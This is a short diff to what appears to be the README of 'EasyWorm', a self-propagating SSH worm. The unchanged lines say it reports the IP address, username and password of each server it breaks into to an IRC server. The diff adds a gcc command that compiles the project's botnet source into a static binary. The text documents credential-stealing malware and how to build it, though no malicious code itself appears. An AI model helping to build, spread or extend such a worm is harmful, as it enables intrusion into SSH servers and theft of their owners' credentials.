@@ -14,3 +14,9 @@ the worm on the remote machine.
 
 Each time EasyWorm has a success access to an SSH server it will notify
 the IP address, user and password to an IRC server.
+
+#compile with
+
+<pre>
+gcc -o ./botnet ../src/botnet.c  -lssh -lcrypto -lz -ldl -static -lgssglue
+</pre>
